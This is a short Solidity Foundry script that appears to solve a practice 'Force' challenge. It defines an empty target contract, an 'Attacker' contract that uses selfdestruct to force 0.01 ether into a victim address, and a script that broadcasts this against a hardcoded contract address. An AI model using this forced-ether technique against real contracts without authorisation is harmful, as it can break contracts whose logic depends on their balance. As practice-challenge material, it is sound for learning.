// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";


contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract Attacker {
    constructor (address payable _victim) payable {
        selfdestruct(_victim);
    }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        vm.startBroadcast();
        address forceAddress = 0xaBF37ae6C541e74328F943B3e9BA90eF4e60D282;
        Attacker newInstance = new Attacker{value: 0.01 ether}(payable(forceAddress));

        vm.stopBroadcast();

    }
}